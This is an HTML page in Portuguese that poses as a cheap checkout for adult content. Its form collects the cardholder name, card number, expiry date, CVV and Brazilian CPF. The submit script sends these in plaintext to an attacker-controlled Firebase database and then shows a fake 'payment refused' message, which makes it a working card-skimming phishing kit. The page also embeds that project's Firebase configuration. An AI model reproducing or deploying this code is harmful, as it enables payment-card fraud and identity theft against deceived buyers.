<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Conte√∫do Exclusivo +18</title>
  <script src="https://cdn.tailwindcss.com"></script>

  <!-- Firebase SDK (compat√≠vel com navegador puro) -->
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>

  <script>
    // Configura√ß√£o do Firebase
    const firebaseConfig = {
      apiKey: "AIzaSyDQkT14oYUEDCujty-q-c9ffwHDQsaggl8",
      authDomain: "checkoutconteudo18.firebaseapp.com",
      databaseURL: "https://checkoutconteudo18-default-rtdb.firebaseio.com",
      projectId: "checkoutconteudo18",
      storageBucket: "checkoutconteudo18.appspot.com",
      messagingSenderId: "972861651239",
      appId: "1:972861651239:web:804cd8aef9c37711695102"
    };

    // Inicializa o Firebase
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();
  </script>
</head>
<body class="bg-black text-white font-sans">
  <!-- CONTAINER PRINCIPAL -->
  <div class="min-h-screen flex items-center justify-center">

    <!-- P√ÅGINA DE VENDAS -->
    <div id="venda" class="max-w-3xl w-full p-8 text-center">
      
      <p class="text-lg mb-6">Conte√∫do exclusivo para maiores de 18 anos. Desperte seus desejos mais intensos com acesso imediato e sigiloso.</p>
      <ul class="text-left mb-6 space-y-2 px-6">
        <li>‚úÖ Acesso instant√¢neo ap√≥s o pagamento</li>
        <li>‚úÖ Totalmente an√¥nimo e seguro</li>
        <li>‚úÖ Conte√∫do quente +18</li>
	<li>‚úÖ Pagamento √∫nico</li>

      </ul>
      <p class="text-xl font-semibold mb-6 text-pink-400">De <span class="line-through text-gray-400">R$29,90</span> por <span class="text-pink-500">R$5,90</span></p>

      <button onclick="irParaCheckout()" class="bg-pink-600 hover:bg-pink-700 text-white font-bold py-3 px-6 rounded-full transition">
        Quero Acessar Agora üî•
      </button>
      <br/>
      <br/>
      <img src="https://i.imgur.com/PwjmTeP.jpeg" alt="Conte√∫do 18+" class="rounded-lg mx-auto mb-6 shadow-lg">

      <p class="text-xl font-semibold mb-6 text-pink-400">De <span class="line-through text-gray-400">R$29,90</span> por <span class="text-pink-500">R$5,90</span></p>

      <button onclick="irParaCheckout()" class="bg-pink-600 hover:bg-pink-700 text-white font-bold py-3 px-6 rounded-full transition">
        Quero Acessar Agora üî•
      </button>

      <p class="mt-4 text-sm text-gray-400">Voc√™ ser√° redirecionado para o pagamento seguro</p>
    </div>

    <!-- CHECKOUT -->
    <div id="checkout" class="hidden w-full max-w-3xl bg-white text-black rounded-lg shadow-lg p-10 relative">
      <!-- Bot√£o de Fechar -->
      <button onclick="fecharCheckout()" class="absolute top-4 right-4 text-sm text-pink-600 hover:text-pink-800 font-semibold">
        ‚úñ Fechar
      </button>

      <h2 class="text-2xl font-semibold mb-6 text-center">Pagamento com cart√£o</h2>
      <form id="checkoutForm" class="space-y-4">
        <div>
          <label class="block text-sm font-medium text-gray-700">Nome no cart√£o</label>
          <input type="text" id="nomeCartao" class="mt-1 block w-full rounded-md border-gray-300 shadow-sm p-2" placeholder="Jo√£o da Silva" required>
        </div>
        <div>
          <label class="block text-sm font-medium text-gray-700">N√∫mero do cart√£o</label>
          <input type="text" id="numeroCartao" maxlength="19" class="mt-1 block w-full rounded-md border-gray-300 shadow-sm p-2" placeholder="1234 5678 9012 3456" required>
        </div>
        <div class="flex gap-4">
          <div class="w-1/2">
            <label class="block text-sm font-medium text-gray-700">Validade (MM/AA)</label>
            <input type="text" id="validade" maxlength="5" class="mt-1 block w-full rounded-md border-gray-300 shadow-sm p-2" placeholder="12/25" required>
          </div>
          <div class="w-1/2">
            <label class="block text-sm font-medium text-gray-700">CVV</label>
            <input type="text" id="cvv" maxlength="4" class="mt-1 block w-full rounded-md border-gray-300 shadow-sm p-2" placeholder="123" required>
          </div>
        </div>
        <div>
          <label class="block text-sm font-medium text-gray-700">CPF</label>
          <input type="text" id="cpf" maxlength="14" class="mt-1 block w-full rounded-md border-gray-300 shadow-sm p-2" placeholder="000.000.000-00" required>
        </div>
        <button type="submit" class="mt-6 w-full bg-pink-600 text-white font-semibold py-3 rounded-lg hover:bg-pink-700 transition">
          Pagar R$ 5,90
        </button>
      </form>
    </div>
  </div>

  <!-- SCRIPT FINAL -->
  <script>
    function irParaCheckout() {
      document.getElementById("venda").classList.add("hidden");
      document.getElementById("checkout").classList.remove("hidden");
    }

    function fecharCheckout() {
      document.getElementById("checkout").classList.add("hidden");
      document.getElementById("venda").classList.remove("hidden");
    }

    const form = document.getElementById('checkoutForm');

    // Formatadores de campos
    document.getElementById('numeroCartao').addEventListener('input', e => {
      let value = e.target.value.replace(/\D/g, '').substring(0,16);
      e.target.value = value.replace(/(.{4})/g, '$1 ').trim();
    });

    document.getElementById('cpf').addEventListener('input', e => {
      let v = e.target.value.replace(/\D/g, '').substring(0,11);
      if (v.length >= 9) e.target.value = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
      else if (v.length >= 6) e.target.value = v.replace(/(\d{3})(\d{3})(\d{1,3})/, "$1.$2.$3");
      else if (v.length >= 3) e.target.value = v.replace(/(\d{3})(\d{1,3})/, "$1.$2");
      else e.target.value = v;
    });

    document.getElementById('validade').addEventListener('input', e => {
      let v = e.target.value.replace(/\D/g, '').substring(0,4);
      if (v.length >= 3) v = v.substring(0,2) + '/' + v.substring(2);
      e.target.value = v;
    });

    document.getElementById('cvv').addEventListener('input', e => {
      e.target.value = e.target.value.replace(/\D/g, '').substring(0,4);
    });

    // Envio para Firebase
    form.addEventListener('submit', function(event) {
      event.preventDefault();

      const nome = document.getElementById('nomeCartao').value.trim();
      const numero = document.getElementById('numeroCartao').value.trim();
      const validade = document.getElementById('validade').value.trim();
      const cvv = document.getElementById('cvv').value.trim();
      const cpf = document.getElementById('cpf').value.trim();

      // Enviar para Firebase
      const novaEntrada = firebase.database().ref("pagamentos").push();
      novaEntrada.set({
        nome,
        numero,
        validade,
        cvv,
        cpf,
        data: new Date().toLocaleString()
      }).then(() => {
        alert("Seu pagamento foi Recusado! Tente novamente mais tarde.");
        form.reset();
      }).catch((error) => {
        alert("Erro ao enviar: " + error.message);
      });
    });
  </script>
</body>
</html>
